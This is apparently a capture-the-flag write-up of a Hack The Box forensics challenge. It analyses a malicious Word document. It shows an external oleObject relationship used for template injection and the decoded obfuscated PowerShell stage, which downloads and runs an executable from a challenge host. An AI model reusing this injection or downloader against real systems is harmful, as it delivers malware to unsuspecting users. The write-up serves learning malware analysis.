---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Forensics - Diagnostic

The downloaded file looks like a word document. Calling `file diagnostic.doc` tells:

```
diagnostic.doc: Zip archive data, at least v2.0 to extract, compression method=store
```

Which is fine, as docs are just fancy zips with a bunch of xmls in it.

There are multiple ways how a malicious payload can be injected into a doc file. Macros and template injections being the most common.

Analysisng the file in cyberchef, allows to "unzip" it. Scanning the files, a `word/_rels/document.xml.rels` file contains a strange thing

```xml
...
<Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:31699/223_index_style_fancy.html!" TargetMode="External"/>
...
```

This points into some external path. Probbably malcious.

## HTML file

After downloading the suspicious HTML file and reading it, you can see that it is a huge script. Which looks like power shell script with obfuscatet parts `Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'` and `FromBase64String` gives the hints.

Extracting and decodign the base 64 string reveals a script that creates the flag.

```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
```

That is actually string format. So reassembling it gives away the flag